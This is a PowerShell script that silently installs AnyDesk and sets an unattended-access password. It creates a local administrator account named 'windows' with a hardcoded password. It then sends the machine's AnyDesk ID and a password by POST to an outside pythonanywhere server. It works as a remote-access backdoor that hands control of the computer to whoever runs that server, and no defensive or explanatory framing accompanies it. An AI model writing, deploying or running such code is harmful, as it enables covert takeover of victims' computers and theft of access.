
	# Set the URL for the AnyDesk installer
	$ANYDESK_URL = \"https://download.anydesk.com/AnyDesk.exe\"
	$ANYDESK_INSTALLER = \"AnyDesk.exe\"
	$PASSWORD = \"  LOL \"

	# Change to the C:\Program Files (x86) directory
	Set-Location -Path \"C:\Program Files (x86)\"

	# Download AnyDesk
	Write-Host "Downloading AnyDesk..."
	Invoke-WebRequest -Uri $ANYDESK_URL -OutFile $ANYDESK_INSTALLER

	# Install AnyDesk silently
	cmd.exe /c "AnyDesk.exe --install  C:\Program Files (x86) --silent"
	cmd.exe /c "echo sckdbask78xk | AnyDesk.exe --set-password"
	cmd.exe /c "net user "windows" "@pass1word" /add"
	cmd.exe /c "net localgroup Administrators "windows" /add"

	# Wait for 5 seconds
	Start-Sleep -Seconds 5

	# Create a temporary file to store the AnyDesk ID
	$tempFile = Join-Path -Path $env:TEMP -ChildPath "anydesk_id.txt"

	# Get the AnyDesk ID and save it to the temporary file
	do {
	    .\AnyDesk.exe --get-id | Out-File -FilePath $tempFile
	    $anydeskID = Get-Content -Path $tempFile
	} while ($anydeskID -eq "0")

	# Display the AnyDesk ID
	Write-Host "Your AnyDesk ID is: $anydeskID"

	# Clean up the temporary file
	Remove-Item -Path $tempFile

	# Send the AnyDesk ID and password to the server
	$url = "https://tomwebb00.pythonanywhere.com/"
	$data = @{
	    "ANID" = $anydeskID
	    "password" = $PASSWORD
	} | ConvertTo-Json
	Invoke-WebRequest -Uri $url -Method Post -Body $data -ContentType "application/json"

	# Wait for user input before exiting

	Read-Host -Prompt "Press Enter to exit"
